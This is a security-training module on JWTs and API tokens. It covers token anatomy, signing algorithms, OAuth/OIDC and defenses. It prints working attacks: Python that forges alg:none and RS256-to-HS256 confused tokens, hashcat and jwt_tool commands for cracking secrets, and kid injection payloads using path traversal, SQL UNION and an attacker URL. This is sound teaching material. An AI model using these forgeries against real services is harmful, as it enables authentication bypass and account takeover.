# JWT and API tokens

JSON Web Tokens are everywhere. Open the network tab on almost any modern app and you'll see `Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...` — that's a JWT. They're popular because they're stateless: the server doesn't have to store sessions anywhere, the token itself carries the identity claim, and the server just verifies the signature on every request.

That same stateless property is also where they break. A JWT is a *self-describing* token, including the algorithm used to sign it, *inside the part that the server is supposed to trust*. If the server believes the token's own claims about how it was signed, the security model collapses. Most JWT bugs you'll encounter are variations on that one mistake.

This module covers the structure, the algorithms (including the famously broken `none`), the common attacks, how to inspect and forge tokens with code and tools, and how to defend.

---

## Anatomy of a JWT

```
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJhbGljZSIsImV4cCI6MTcwMDAwMDAwMH0.f3Yk2J3jXyR0...
└────────── header ─────────────┘ └──────────── payload ────────────────┘ └────── sig ───────┘
```

Three base64url-encoded segments separated by dots. Decode each:

```bash
echo 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9' | base64 -d
# {"alg":"HS256","typ":"JWT"}

echo 'eyJzdWIiOiJhbGljZSIsImV4cCI6MTcwMDAwMDAwMH0' | base64 -d
# {"sub":"alice","exp":1700000000}
```

The signature is the binary signature of `base64url(header) + "." + base64url(payload)`, encoded as base64url. Without the key (HMAC) or the private key (RSA/ECDSA), you can't produce a valid signature — assuming the server actually verifies it.

Important: **base64url** is base64 with `-` and `_` instead of `+` and `/`, and no `=` padding. Plain `base64 -d` mostly works in practice; you may need to add `==` padding back in.

### Header

| Claim | Meaning |
|-------|---------|
| `alg` | Signing algorithm (`HS256`, `RS256`, `ES256`, `none`, …) |
| `typ` | Token type, usually `JWT` |
| `kid` | Key ID — selects which key to verify with |
| `jku` | URL where the JWKS (key set) lives |
| `x5u`, `x5c`, `x5t` | X.509 cert pointers |

### Payload (claims)

Standard "registered" claims:

| Claim | Meaning |
|-------|---------|
| `iss` | Issuer (who minted the token) |
| `sub` | Subject (typically the user ID) |
| `aud` | Audience (who the token is for) |
| `exp` | Expiry time (unix seconds) |
| `nbf` | Not before |
| `iat` | Issued at |
| `jti` | JWT ID (unique per token) |

The rest is application-specific. Common app claims: `email`, `role`, `tenant`, `scopes`. **Never** put secrets in here — the payload is base64-encoded, not encrypted. Anyone who has the token can read it.

---

## The algorithms

| `alg` | Family | Key | Notes |
|-------|--------|-----|-------|
| `HS256`, `HS384`, `HS512` | Symmetric HMAC | Single shared secret | Verifier needs the same secret as the signer |
| `RS256`, `RS384`, `RS512` | RSA signature | Private key signs, public key verifies | Most common in OAuth/OIDC |
| `ES256`, `ES384`, `ES512` | ECDSA signature | EC private/public key | Shorter signatures, modern default |
| `PS256`, `PS384`, `PS512` | RSA-PSS | Same as RS* but with PSS padding | Recommended over RS* in new designs |
| `EdDSA` | Ed25519 | EC private/public key | Fast and modern |
| `none` | None | None | Token is unsigned. **Always insecure if accepted.** |

**Why this matters in practice:**

- HS256 = both parties have the same secret. The "key" is just a string — usually a server secret. If it's short, you can brute force it.
- RS256 = server has a private key, *anyone* can verify with the public key. Public is meant to be public.
- The famous attacks come from confusing these two.

---

## Attack 1 — `alg: none`

The original sin. Specified by JWT, supported by many old libraries, never appropriate for production.

If the server accepts `alg: none`, you can forge any payload you like:

```python
import base64, json

header  = {"alg": "none", "typ": "JWT"}
payload = {"sub": "admin", "role": "admin", "exp": 9999999999}

def b64(d):
    return base64.urlsafe_b64encode(json.dumps(d, separators=(",", ":")).encode()).rstrip(b"=").decode()

token = f"{b64(header)}.{b64(payload)}."   # empty signature
print(token)
```

Send this as `Authorization: Bearer <token>` and on a vulnerable server you become admin. The trailing dot is required — the signature segment must exist, just be empty.

Variants that bypass naive denylists:

- `alg: None` (different capitalization)
- `alg: NONE`
- `alg: nOnE`

Modern libraries refuse `none` by default. But you'll still find it in legacy apps, vendor SDKs, and homegrown verifiers. **Always try it first.**

---

## Attack 2 — RS256 → HS256 key confusion

A classic. The server is configured for RS256 — it has a private key for signing and the matching public key for verification. The public key is, by definition, *public*.

The attacker:

1. Grabs the server's RSA **public** key (often at `/.well-known/jwks.json`, or in a config repo).
2. Forges a token with header `alg: HS256`.
3. Signs it with HMAC-SHA256 using the **public key bytes** as the HMAC secret.
4. Sends the token to the server.

If the server reads `alg` from the token and passes the public key to a verifier that *happens to be HMAC* (because the alg says HS256), the verification succeeds. The attacker controls the payload.

```python
import jwt
with open("server_pubkey.pem") as f:
    pub = f.read()
forged = jwt.encode(
    {"sub": "admin", "role": "admin"},
    key=pub,                         # use the public key as the HMAC secret
    algorithm="HS256",
)
print(forged)
```

The fix is to *never* let the token tell the server what algorithm to use. The server should hard-code `algorithms=["RS256"]` when verifying:

```python
jwt.decode(token, public_key, algorithms=["RS256"])   # safe
jwt.decode(token, public_key)                          # vulnerable to alg confusion
```

---

## Attack 3 — weak HS256 secret brute-force

When the algorithm is HS256, security depends entirely on the secret being long, random, and never leaked. If the developer used `"secret"` or `"hunter2"` or the app's name in lowercase, you can brute-force it in seconds.

```bash
# hashcat: -m 16500 is JWT HS256
hashcat -a 0 -m 16500 token.txt rockyou.txt
```

Or with [`jwt_tool`](https://github.com/ticarpi/jwt_tool):

```bash
python3 jwt_tool.py <TOKEN> -C -d /usr/share/wordlists/rockyou.txt
```

Once you have the secret, you can mint any token you want:

```python
import jwt
forged = jwt.encode({"sub": "admin", "role": "admin"}, "the_cracked_secret", algorithm="HS256")
```

This bug class is dead-simple to defend against and depressingly common. Long, random, distinct secrets per environment, rotated on a schedule.

---

## Attack 4 — no expiry / weak expiry

If `exp` is missing, the token lives forever. Stolen → permanent compromise.

If `exp` is too far out (90 days), revocation needs a separate denylist mechanism, and most apps don't have one.

**Test:** wait until the apparent expiry passes, then try the old token. If it still works, expiry isn't enforced.

```bash
date -d @1700000000        # decode unix timestamp from the payload
# Tue Nov 14 22:13:20 UTC 2023
```

### Fix

- Short access tokens (5–15 minutes).
- Long-lived refresh tokens stored server-side (revocable).
- Reject tokens with no `exp` claim.

---

## Attack 5 — `kid` injection

The `kid` header tells the server which key to load. If the server uses `kid` as a filename or as a SQL identifier, it's injectable:

```json
{"alg":"HS256","kid":"../../../../dev/null"}
```

If the server does:

```python
key = open(f"keys/{header['kid']}").read()
```

…and `/dev/null` is empty, then the verifier verifies against the empty string. You can then sign your token with HMAC and an empty secret.

Variants:

- `kid` as a SQL lookup: `kid` = `' UNION SELECT 'attacker_secret'--`
- `kid` as a URL: `kid` = `https://evil.tld/key.json` and now the server fetches your key

### Fix

Treat `kid` as an opaque identifier, validate it against a whitelist of known IDs, never as a filename or query parameter.

---

## Attack 6 — `jku` / `jwk` header attacks

`jku` is a URL pointing at a JWKS (JSON Web Key Set). `jwk` is a key embedded directly in the header. Either lets the *token* describe the verification key. If the server trusts the header to provide its own key, you can sign with your own private key, embed the matching public key in the header, and the server happily verifies.

```json
{
  "alg": "RS256",
  "jwk": {
    "kty": "RSA",
    "n": "...attacker public key modulus...",
    "e": "AQAB"
  }
}
```

### Fix

- Don't trust `jku` / `jwk` from the token. Pin the verification key set at startup.
- If you must support `jku`, allow-list which URLs you'll fetch from.

---

## Inspecting a JWT — three ways

### By hand (recommended at least once)

```bash
TOKEN="eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiJhbGljZSJ9.SflKxw..."
IFS='.' read -r H P S <<<"$TOKEN"

# Add padding back, decode
echo "$H==" | tr '_-' '/+' | base64 -d
echo "$P==" | tr '_-' '/+' | base64 -d
```

You're not running a tool — you're reading two JSON objects. This is the moment JWTs stop looking magic.

### Python one-liner

```bash
python3 -c '
import base64, json, sys
t = sys.argv[1]; h, p, _ = t.split(".")
for s in (h, p):
    print(json.dumps(json.loads(base64.urlsafe_b64decode(s + "=" * (-len(s) % 4))), indent=2))
' "$TOKEN"
```

Stick this in your shell config as `jwtcat` and you'll use it constantly.

### Tools

- [`jwt.io`](https://jwt.io/) — the canonical debugger. **Never paste production tokens** — the page renders client-side but the URL ends up in browser history.
- Burp **JWT Editor** extension — decode, edit, re-sign in place inside Repeater.
- [`jwt_tool`](https://github.com/ticarpi/jwt_tool) — CLI swiss army knife. Cracks, forges, runs every common attack with one command.

```bash
python3 jwt_tool.py <TOKEN>                                # inspect
python3 jwt_tool.py <TOKEN> -X a                           # alg:none attack
python3 jwt_tool.py <TOKEN> -X k -pk pubkey.pem            # RS256→HS256 confusion
python3 jwt_tool.py <TOKEN> -C -d wordlist.txt             # crack HMAC secret
```

---

## Burp workflow for JWTs

1. Capture a request that carries a JWT.
2. Send it to Repeater.
3. Open the **JWT Editor** tab inside Repeater (after installing the extension).
4. Decode → edit a claim (`"role":"admin"`) → choose an attack (`Sign with embedded key`, `Symmetric key signing`, `Attack: none`) → click **Apply**.
5. Send the modified request.

This is the standard PortSwigger Academy workflow for the JWT labs, and it's the same workflow you'll use on a real engagement.

---

## OAuth 2.0 and OIDC in 90 seconds

JWTs make most sense in the context of OAuth 2.0 and OpenID Connect. The short version:

| Term | Meaning |
|------|---------|
| **OAuth 2.0** | A framework for delegated authorization. "GitHub, can this app act on my behalf?" |
| **OIDC** | A thin identity layer on top of OAuth 2.0. Adds the **ID token** (always a JWT). |
| **Authorization Server (AS)** | Issues tokens (e.g., Google, Auth0, Cognito) |
| **Resource Server (RS)** | Accepts the token to grant access (your API) |
| **Client** | The app the user is using |
| **Access token** | Sent to the RS to call APIs. Often a JWT. |
| **ID token** | Says "this is who logged in." Always a JWT. |
| **Refresh token** | Exchange for a new access token. Long-lived. |

The flows you'll meet:

| Flow | Use case |
|------|----------|
| **Authorization Code + PKCE** | Modern web/mobile apps. The default. |
| **Client Credentials** | Service-to-service, no human |
| **Device Code** | TVs, CLIs — no browser on the device |
| **Implicit** | Deprecated. Don't use it. |
| **Resource Owner Password Credentials** | Deprecated. Definitely don't use it. |

The high-value attacks against OAuth itself are open-redirect chains (`redirect_uri` allow-list bypass), PKCE downgrade, scope upgrade. Each maps to "validate everything server-side, never trust the client to enforce policy."

---

## API key vs Session vs JWT

The three mechanisms used in the wild, compared.

| Property | API key | Server-side session | JWT |
|----------|---------|---------------------|-----|
| **Where state lives** | Server (key → user) | Server (session ID → state) | Client (signed claims) |
| **Revocation** | Easy (delete the key) | Easy (delete the session) | Hard (need denylist or short expiry) |
| **Stateless?** | No (server lookup) | No | Yes |
| **Carries identity claims?** | Usually no | No (separate lookup) | Yes |
| **Typical scope** | App-to-app | User session in a browser | User or service identity |
| **Sent as** | `X-API-Key: ...` or `Authorization: ...` | Cookie | `Authorization: Bearer ...` |
| **Theft impact** | Use of API as that key's owner | Account hijack | Account hijack until expiry |
| **Best for** | Long-lived service identity | Browser sessions | Stateless services, mobile, federated identity |

The right answer depends on the use case. A common modern stack:

- Web app login → server-side session cookie (revocable, simple).
- Mobile app login → short access JWT + long refresh token.
- Service-to-service inside the cluster → short-lived JWT minted via a workload identity (mTLS or SPIFFE).
- Third-party API access → API key.

Avoid "JWT for everything" — for sessions in the browser, the cookie + server session pattern is simpler, cheaper, and easier to revoke.

---

## Defenses checklist

A summary you can put in your notes:

| Defense | What it stops |
|---------|---------------|
| Hard-code allowed `algorithms` at the verifier | `alg:none`, RS→HS confusion |
| Long random HMAC secrets (≥ 256 bits, generated by CSPRNG) | Brute force |
| Rotate secrets / keys on a schedule | Long-lived compromise |
| Short access-token expiry (5–15 min) | Stolen-token blast radius |
| Refresh tokens stored server-side and revocable | "JWTs are forever" problem |
| Require `exp`, `iat`, `iss`, `aud` claims | Replay across services |
| Validate `aud` matches *your* service | Token-replay across services |
| Pin the JWKS / verification key at startup | `jku` / `jwk` header injection |
| Validate `kid` against an allow-list | `kid` injection |
| Reject tokens larger than N bytes | DoS via giant payload |
| Never log raw tokens | Token leak via observability stack |
| Send tokens over HTTPS only | Network theft |
| Don't put tokens in URLs | Referer / log leak |

---

## Mini-lab — practice JWT skills

The CSOT lab webapp doesn't use JWTs (its sessions are simpler cookies). The best place to drill JWT skills is **PortSwigger Web Security Academy**:

- "JWT authentication bypass via unverified signature" — confirms you understand the basics.
- "JWT authentication bypass via flawed signature verification" — the `none` attack.
- "JWT authentication bypass via weak signing key" — HMAC brute-force with `hashcat` or `jwt_tool`.
- "JWT authentication bypass via jwk header injection" — algorithm confusion via `jwk`.
- "JWT authentication bypass via jku header injection" — same idea via `jku`.
- "JWT authentication bypass via kid header path traversal" — the file-system flavor of `kid`.

Spend an evening on the JWT track. It's the densest single topic in PortSwigger's catalog and the techniques carry over to almost every real-world bug bounty engagement involving APIs.

---

## Gotchas worth tattooing

- **`alg:none` first, always.** The five seconds it takes to test is sometimes the whole engagement.
- The JWT payload is **not encrypted**. Treat its contents as world-readable.
- `base64url` is not `base64`. Tools that don't handle the alphabet/padding correctly will silently misdecode.
- Some libraries' `decode()` doesn't verify the signature unless you pass `verify=True`. Read the docs.
- A token without `exp` is a permanent backdoor.
- A token validated only on the gateway, with the backend trusting the gateway-set headers, is bypassable if you can talk to the backend directly.

---

## Further reading

- [JWT.io introduction](https://jwt.io/introduction) — the canonical primer (skip the live debugger for real tokens).
- [RFC 7519 — JWT](https://www.rfc-editor.org/rfc/rfc7519) and [RFC 7515 — JWS](https://www.rfc-editor.org/rfc/rfc7515) — the specs.
- [PortSwigger — JWT attacks](https://portswigger.net/web-security/jwt) — by far the best free walkthrough.
- [`jwt_tool` README](https://github.com/ticarpi/jwt_tool) — covers every attack class in detail.
- [Auth0 — common JWT mistakes](https://auth0.com/blog/critical-vulnerabilities-in-json-web-token-libraries/) — the postmortem of the original `alg:none` discovery.
- [HackTricks — JWT](https://book.hacktricks.xyz/pentesting-web/hacking-jwt-json-web-tokens) — encyclopedia of payloads and bypasses.

---

## What you should be able to do now

- Decode any JWT by hand into header and payload JSON.
- Recognize `alg:none`, `HS256`, `RS256` and what each implies for attack and defense.
- Forge an `alg:none` token in Python in under a minute.
- Run `jwt_tool` against a captured token and read its findings.
- Modify a JWT inside Burp Repeater via the JWT Editor extension.
- Tell a developer the three changes that would have stopped each of the attacks above.

If any of those are shaky, repeat the PortSwigger JWT track once more. Then move on.

---

## Next week

[Week 4 — Cryptography & forensics](../Week-04/) — JWTs were a fast preview of the question "what does it mean for something to be signed?" Next week we go deep on cryptography itself: hashing, symmetric/asymmetric encryption, common attacks on weak crypto, and then forensics — recovering data from disk and memory once an incident has already happened.
